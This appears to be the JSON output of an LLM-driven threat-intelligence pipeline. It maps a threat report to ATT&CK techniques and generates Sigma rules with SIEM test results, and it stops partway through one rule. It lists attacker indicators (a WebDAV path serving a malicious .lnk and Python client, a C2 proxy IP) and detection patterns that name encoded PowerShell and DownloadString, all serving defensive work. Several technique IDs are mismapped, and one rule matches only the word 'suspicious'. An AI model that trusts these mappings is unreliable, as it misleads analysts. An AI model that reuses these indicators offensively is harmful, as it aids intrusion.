{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 20,
      "processing_time_ms": 0
    },
    "extraction_results": [
      {
        "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
        "extracted_ttps": [
          {
            "ttp_id": "eedbb5ef-32ec-4a45-a241-c15634f592d1",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "PowerShell",
            "attack_id": "T1059.001",
            "tactic": "Execution",
            "description": "The attackers used PowerShell to execute commands and scripts",
            "confidence_score": 0.718,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.62,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe",
              "-windowstyle hidden",
              "-encodedCommand"
            ],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "at",
              "base64",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "80026e3b-99e7-4e24-a21f-5a725d1498c0",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "PowerShell",
            "attack_id": "T1086",
            "tactic": "Execution",
            "description": "Detected PowerShell activity via NLP pattern matching",
            "confidence_score": 0.684,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "base64",
              "at",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "1b798f72-bf50-48e1-86ac-ee20b0ed19fd",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "SMB/Windows Admin Shares",
            "attack_id": "T1190",
            "tactic": "Lateral Movement",
            "description": "The attackers used SMB to access and execute files on remote systems",
            "confidence_score": 0.669,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "\\\\\\194[.]126.178.8@80\\webdav\\Docs\\231130 No 581.pdf .lnk",
              "\\\\\\194[.]126.178.8@80\\webdav\\Python39\\Client[.]py"
            ],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "at",
              "base64",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "SMB",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "63b38f66-2e7c-4896-8559-665d2b451b72",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The attackers relied on users to open malicious links and execute malware",
            "confidence_score": 0.669,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "e-mails with links to 'documents'",
              "opening which leads to the launch A PowerShell command"
            ],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "at",
              "base64",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "Social Engineering",
              "zip"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "80fffc6b-13cc-4274-83a0-4d8be93a971e",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "Proxy",
            "attack_id": "T1090",
            "tactic": "Command and Control",
            "description": "The attackers used a proxy to communicate with the C2 server",
            "confidence_score": 0.666,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "88[.]209.251.6:80",
              "jrb@bahouholdings.com"
            ],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "at",
              "base64",
              "ipconfig",
              "sc",
              "Proxy",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "73c16096-be57-4bd7-bf3c-09f25a3054a6",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "Remote Services",
            "attack_id": "T1021",
            "tactic": "Lateral Movement",
            "description": "The attackers used remote services to access and control systems",
            "confidence_score": 0.662,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ssh.exe",
              "-N -o ServerAliveInterval=30"
            ],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "at",
              "base64",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "SSH",
              "impacket",
              "zip"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "1f14c009-0423-43ed-a015-28e6e731bd11",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "System Owner/User Discovery",
            "attack_id": "T1033",
            "tactic": "Discovery",
            "description": "The attackers used PowerShell to discover system owners and users",
            "confidence_score": 0.662,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Get-ADDomainController",
              "Get-User"
            ],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "at",
              "base64",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b88610ba-7e9d-4d6b-a9ff-1c83f356cd45",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "Application Window Discovery",
            "attack_id": "T1071",
            "tactic": "Discovery",
            "description": "The attackers used PowerShell to discover application windows",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Get-Process",
              "Get-Window"
            ],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "at",
              "base64",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "0355ff4f-9434-4cf7-bcfc-7921d07088d4",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "The attackers used PowerShell to gather system information",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Get-WinEvent",
              "Get-ADDomainController"
            ],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "at",
              "base64",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "beec94ce-ac63-4bc1-864f-e7a01398989c",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "Data from Local System",
            "attack_id": "T1005",
            "tactic": "Collection",
            "description": "The attackers collected data from the local system",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Get-Content",
              "Compress-Archive"
            ],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "at",
              "base64",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "405afc05-9f6c-4cd6-88bb-53c362693b9c",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "Network Service Scanning",
            "attack_id": "T1046",
            "tactic": "Discovery",
            "description": "The attackers scanned for open network services",
            "confidence_score": 0.652,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Get-NetAdapter",
              "Get-NetIPConfiguration"
            ],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "at",
              "base64",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "80513426-4a0d-4c97-bca2-da4bdf9a7723",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "Detected Create or Modify System Process activity via NLP pattern matching",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.246,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "base64",
              "at",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "5210533c-d07b-4b6d-aff3-121297252ab5",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "base64",
              "at",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "c65453da-469d-44c7-93b1-a59ca3b313b1",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "base64",
              "at",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "17e502ba-2c0c-4318-9bd3-f0226f1cfd1b",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "base64",
              "at",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "f2fba903-3397-40d5-954e-a9c81285f514",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "base64",
              "at",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "4c3609a8-5ca2-49fd-8f06-40847c306b1e",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "Network Service Discovery",
            "attack_id": "T1046",
            "tactic": "Discovery",
            "description": "Detected Network Service Discovery activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "base64",
              "at",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "b7588421-8c29-4cb2-8704-7f485b506983",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "base64",
              "at",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "94754ddd-f76f-4635-afaf-f4830250e8e3",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "Remote Services",
            "attack_id": "T1021",
            "tactic": "Lateral Movement",
            "description": "Detected Remote Services activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "base64",
              "at",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "1c511ebf-3c3d-4699-9a24-67c640dc2507",
            "report_id": "pdf-72b4e262684a0567753364816ad39a2a",
            "technique_name": "Registry Run Keys",
            "attack_id": "T1547.001",
            "tactic": "Persistence",
            "description": "Detected Registry Run Keys activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "IPConfig",
              "NMAP",
              "net",
              "powershell",
              "base64",
              "at",
              "ipconfig",
              "sc",
              "reg",
              "cmd",
              "PowerShell",
              "impacket",
              "zip"
            ],
            "extraction_method": "nlp_indicator"
          }
        ]
      }
    ]
  },
  "rules": {
    "rules": [
      {
        "title": "Suspicious PowerShell Execution with Obfuscation and Hidden Window",
        "description": "Detects PowerShell execution with obfuscation techniques such as Base64-encoded commands and hidden window style, often associated with malicious activity. Also includes detection of execution from .lnk files and common parent processes used in lateral movement or script launching.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_encoded_base64": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|re": "(?i)-enc(?:oded)?Command\\s+[A-Za-z0-9+/]{50,}"
          },
          "selection_hidden_window": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-windowstyle hidden"
          },
          "selection_from_lnk": {
            "Image|endswith": "\\powershell.exe",
            "ParentImage|endswith": [
              ".lnk",
              "\\rundll32.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\\mshta.exe",
              "\\svchost.exe",
              "\\cmd.exe"
            ]
          },
          "condition": "selection_encoded_base64 or selection_hidden_window or selection_from_lnk"
        },
        "falsepositives": [
          "Legitimate administrative automation tools (e.g., SCCM, Ansible) using encoded commands",
          "Software installers launching PowerShell with hidden windows",
          "Enterprise monitoring tools executing scripts"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059.001",
          "custom.threat-group:apt29",
          "custom.threat-group:apt32",
          "custom.detection:powershell",
          "custom.obfuscation:base64"
        ],
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "generation_method": "langchain",
        "id": "c1a20ecc-42e9-479f-9889-d67903a8ea10",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 54,
          "query_time_ms": 623.0
        }
      },
      {
        "title": "Suspicious PowerShell Execution with Base64 Payloads and Shortcut Launches",
        "description": "Detects execution of PowerShell (including Base64\u2011encoded payloads), cmd.exe invoking PowerShell, and .lnk shortcut execution, with emphasis on suspicious parent processes. Helps identify ATT&CK T1059.001 (PowerShell) activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "-EncodedCommand",
              "Invoke-Expression",
              "IEX",
              "DownloadString"
            ],
            "CommandLine|regex": "(?i)[A-Za-z0-9+/]{100,}={0,2}"
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "powershell",
              "-enc",
              "-EncodedCommand",
              "Invoke-Expression",
              "IEX"
            ]
          },
          "selection_lnk": {
            "Image|endswith": ".lnk"
          },
          "selection_parent": {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\rundll32.exe",
              "\\wscript.exe"
            ]
          },
          "condition": "(selection_powershell and selection_parent) or (selection_cmd and selection_parent) or selection_lnk"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell with -enc for encoding",
          "Scheduled tasks or system maintenance that run PowerShell commands",
          "User\u2011created shortcuts (.lnk) that launch applications",
          "Software installers that invoke PowerShell via cmd.exe"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059.001",
          "custom.powershell"
        ],
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "generation_method": "langchain",
        "id": "3c2af4f5-c2d0-4476-a2c0-0140e16665dc",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 58,
          "query_time_ms": 952.0000000000001
        }
      },
      {
        "title": "Suspicious SMB and WebDAV Access via Command Line Tools",
        "description": "Detects use of command-line tools to access Windows admin shares (admin$, ipc$) or specific WebDAV paths associated with malicious activity, indicative of lateral movement via SMB or WebDAV.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative use of net.exe to map network drives",
          "Automated IT management tools accessing admin$ or ipc$ for system maintenance",
          "Software deployment scripts using UNC paths"
        ],
        "level": "high",
        "tags": [
          "attack.t1021.002",
          "attack.lateral_movement",
          "custom.windows",
          "custom.smb",
          "custom.webdav",
          "custom.net-use"
        ],
        "ttp_id": "unknown",
        "technique_name": "SMB/Windows Admin Shares",
        "generation_method": "langchain",
        "id": "a53951d0-2c6d-4fc9-b64b-35f61c3c0b5e",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 721.0
        }
      },
      {
        "title": "User Execution \u2013 Malicious Shortcut or Office Document Triggered PowerShell with Base64 Payload",
        "description": "Detects execution of PowerShell with a Base64\u2011encoded command launched from user\u2011initiated actions such as malicious shortcuts (.lnk) or Office documents, covering common phishing and user\u2011execution scenarios.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_lnk": {
            "Image|endswith": ".lnk",
            "ParentImage|endswith": "explorer.exe"
          },
          "selection_winword_ps": {
            "ParentImage|endswith": "winword.exe",
            "Image|endswith": "powershell.exe",
            "CommandLine|regex": "-EncodedCommand\\s+[A-Za-z0-9+/=]{100,}"
          },
          "selection_excel_ps": {
            "ParentImage|endswith": "excel.exe",
            "Image|endswith": "powershell.exe",
            "CommandLine|regex": "-EncodedCommand\\s+[A-Za-z0-9+/=]{100,}"
          },
          "selection_powerpnt_ps": {
            "ParentImage|endswith": "powerpnt.exe",
            "Image|endswith": "powershell.exe",
            "CommandLine|regex": "-EncodedCommand\\s+[A-Za-z0-9+/=]{100,}"
          },
          "selection_cmd_ps": {
            "ParentImage|endswith": "cmd.exe",
            "Image|endswith": "powershell.exe",
            "CommandLine|regex": "-EncodedCommand\\s+[A-Za-z0-9+/=]{100,}"
          },
          "selection_rundll32_ps": {
            "ParentImage|endswith": "rundll32.exe",
            "Image|endswith": "powershell.exe",
            "CommandLine|regex": "-EncodedCommand\\s+[A-Za-z0-9+/=]{100,}"
          },
          "selection_ps_generic": {
            "Image|endswith": "powershell.exe",
            "CommandLine|regex": "-EncodedCommand\\s+[A-Za-z0-9+/=]{100,}"
          },
          "condition": "selection_lnk or selection_winword_ps or selection_excel_ps or selection_powerpnt_ps or selection_cmd_ps or selection_rundll32_ps or selection_ps_generic"
        },
        "falsepositives": [
          "Legitimate administrative scripts that use PowerShell -EncodedCommand for deployment.",
          "User\u2011created shortcuts (.lnk) that launch PowerShell for automation.",
          "Office macros or add\u2011ins that legitimately invoke PowerShell (e.g., for data processing).",
          "System maintenance tasks that run PowerShell via cmd.exe or rundll32.exe."
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1204",
          "attack.t1059.001",
          "attack.t1566.001"
        ],
        "ttp_id": "unknown",
        "technique_name": "User Execution",
        "generation_method": "langchain",
        "id": "44052d86-c331-4c91-810e-01f90be99582",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 56,
          "query_time_ms": 506.0
        }
      },
      {
        "title": "Proxy C2 Communication via PowerShell, Shortcut Execution, and Known Proxy IP",
        "description": "Detects use of a known proxy IP (88.209.251.6:80) or email indicator, execution of .lnk shortcuts, Base64\u2011encoded PowerShell commands, and processes launched by common command shells (cmd.exe, rundll32.exe, powershell.exe) that may be used to establish proxy C2 channels.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_lnk": {
            "Image|endswith": ".lnk"
          },
          "selection_powershell_base64": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|regex": "(?i)-EncodedCommand\\s+[A-Za-z0-9+/=]{20,}"
          },
          "selection_parent_cmd": {
            "ParentImage|endswith": "\\cmd.exe"
          },
          "selection_parent_rundll": {
            "ParentImage|endswith": "\\rundll32.exe"
          },
          "selection_parent_powershell": {
            "ParentImage|endswith": "\\powershell.exe"
          },
          "selection_proxy_ip": {
            "DestinationIp": "88.209.251.6"
          },
          "selection_email": {
            "CommandLine|contains": "jrb@bahouholdings.com"
          },
          "condition": "selection_lnk or selection_powershell_base64 or selection_parent_cmd or selection_parent_rundll or selection_parent_powershell or selection_proxy_ip or selection_email"
        },
        "falsepositives": [
          "Legitimate shortcut (.lnk) files used by administrators or users.",
          "System or admin scripts that legitimately use PowerShell with -EncodedCommand for deployment or configuration.",
          "Normal usage of cmd.exe, rundll32.exe, or powershell.exe as parent processes for routine tasks.",
          "Allowed network traffic to 88.209.251.6 (e.g., corporate services hosted on that IP).",
          "Email address appearing in benign command lines (e.g., mail sending scripts)."
        ],
        "level": "critical",
        "tags": [
          "attack.t1090",
          "attack.command_and_control",
          "custom.proxy"
        ],
        "ttp_id": "unknown",
        "technique_name": "Proxy",
        "generation_method": "langchain",
        "id": "5a5e8891-c242-4488-aba7-c80510497a21",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 52,
          "query_time_ms": 567.0000000000001
        }
      },
      {
        "title": "Suspicious SSH Tunneling via ssh.exe with Keep-Alive Options",
        "description": "Detects use of ssh.exe with options commonly associated with tunneling and persistent remote access, such as -N and ServerAliveInterval, which may indicate lateral movement or command and control (C2) activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\ssh.exe",
            "CommandLine|contains": [
              "-N",
              "-o ServerAliveInterval=30"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate SSH tunneling by administrators or developers",
          "Automated DevOps tools using SSH port forwarding in CI/CD pipelines"
        ],
        "level": "high",
        "tags": [
          "attack.t1021",
          "attack.lateral_movement",
          "custom.cloudtrail",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Services",
        "generation_method": "langchain",
        "id": "5e3fc185-e26f-4a09-8cf4-affe4f07e4d1",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 631.0
        }
      },
      {
        "title": "System Owner/User Discovery via PowerShell with Encoded or .lnk Execution",
        "description": "Detects use of PowerShell to discover system owners or users via Get-ADDomainController or Get-User, especially when combined with encoded commands or .lnk file execution, which are common in malicious activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmdlets": {
            "CommandLine|contains": [
              "Get-ADDomainController",
              "Get-User"
            ]
          },
          "selection_powerShell": {
            "Image|endswith": "\\powershell.exe"
          },
          "selection_encoded": {
            "CommandLine|contains": [
              "-EncodedCommand",
              "-enc"
            ],
            "CommandLine|re": "[A-Za-z0-9+/]{100,}={0,2}"
          },
          "selection_lnk": {
            "CommandLine|contains": "-File",
            "CommandLine|endswith": ".lnk\""
          },
          "condition": "selection_cmdlets and selection_powerShell and (selection_encoded or selection_lnk)"
        },
        "falsepositives": [
          "Legitimate administrative use of Get-ADDomainController or Get-User by system administrators",
          "Automated scripts using these cmdlets in trusted environments"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1033",
          "attack.t1027",
          "custom.power_shell",
          "custom.encoded_command",
          "custom.lnk_execution"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Owner/User Discovery",
        "generation_method": "langchain",
        "id": "370b7b3b-9db3-4b86-b78c-143d3858579e",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Invalid SPL: Unbalanced quotes.",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "Application Window Discovery via PowerShell",
        "description": "Detects use of PowerShell to discover application windows using cmdlets such as Get-Process, Get-Window, or .NET screen enumeration APIs.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ],
            "CommandLine|contains": [
              "Get-Process",
              "Get-Window",
              "-WindowStyle Hidden",
              "[System.Windows.Forms.Screen]::AllScreens",
              "EnumWindows"
            ]
          },
          "condition": "selection"
